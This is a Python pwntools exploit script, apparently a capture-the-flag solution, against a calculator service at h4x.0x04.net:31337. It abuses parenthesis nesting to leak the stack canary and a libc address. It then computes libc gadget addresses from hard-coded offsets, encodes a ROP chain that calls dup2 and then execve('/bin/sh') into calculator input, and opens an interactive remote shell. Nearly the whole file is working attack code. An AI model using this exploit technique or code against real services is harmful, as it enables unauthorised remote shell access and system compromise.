from pwn import *


HOST = 'h4x.0x04.net'
PORT = 31337


class Exploit:
    LIBC_START_OFFSET = 104816
    EXECVE_OFFSET = 750384
    DUP2_OFFSET = 902656
    BINSH_OFFSET = 1439057
    POP2_OFFSET = 980240 # ropshell.com

    def __init__(self, host, port):
        self.host = host
        self.port = port

    def obtain_value(self, offset):
        p = connect(self.host, self.port)
        p.sendline('(' * offset + ')' * (offset - 1))

        res = int(p.recvline())

        p.close()

        return res

    def run(self):
        canary = self.obtain_canary()
        libc_start = self.obtain_libc_start()
        self.hack(canary, libc_start)

    def obtain_canary(self):
        canary_offset = 32
        return self.obtain_value(canary_offset)

    def obtain_libc_start(self):
        offset_ret_to_start_main = 9
        libc_start_offset = 79
        return self.obtain_value(libc_start_offset) - offset_ret_to_start_main

    def compute_mutate_sequence(self, current, target):
        # compute sequence of chars which convert
        # current to target via calculator parsing digits
        # x * 10 + c, where c is next digit
        # positive number
        result_int = (target - (current * 10**10)) % (2 **32)
        result_int += 2 ** 32
        result_int %= 2 ** 32
        result_int += 2 ** 32
        return str(result_int)

    def stack_to_payload(self, stack):
        payload = '(' * len(stack) + str(stack[-1]) + ')'
        last = stack[-1]

        for next_val in reversed(stack[:-1]):
            payload += self.compute_mutate_sequence(last, next_val)
            payload += ')'
            last = next_val

        return payload

    def hack_payload(self, canary, libc_start):
        # libc_elf = ELF('/lib/i386-linux-gnu/libc.so.6')
        libc_base = libc_start - self.LIBC_START_OFFSET # libc_elf.symbols['__libc_start_main']

        execve = libc_base + self.EXECVE_OFFSET # libc_elf.symbols['execve'] #
        dup2 = libc_base + self.DUP2_OFFSET # libc_elf.symbols['dup2'] #
        pop2 = libc_base + self.POP2_OFFSET # 1025168
        binsh = libc_base + self.BINSH_OFFSET # list(libc_elf.search('/bin/sh'))[0]

        start = [0] * 30
        canary_padding = [canary, 0, 0, 0]
        rop_chain = [dup2, pop2, 4, 0, dup2, pop2, 4, 1, execve, 0, binsh, 0, 0]
        sentinel = [0]

        stack_layout = start + canary_padding + rop_chain + sentinel

        return self.stack_to_payload(stack_layout)


    def hack(self, canary, libc_base):
        p = connect(self.host, self.port)

        p.sendline(self.hack_payload(canary, libc_base))

        p.interactive()


if __name__ == "__main__":
    exp = Exploit(HOST, PORT).run()
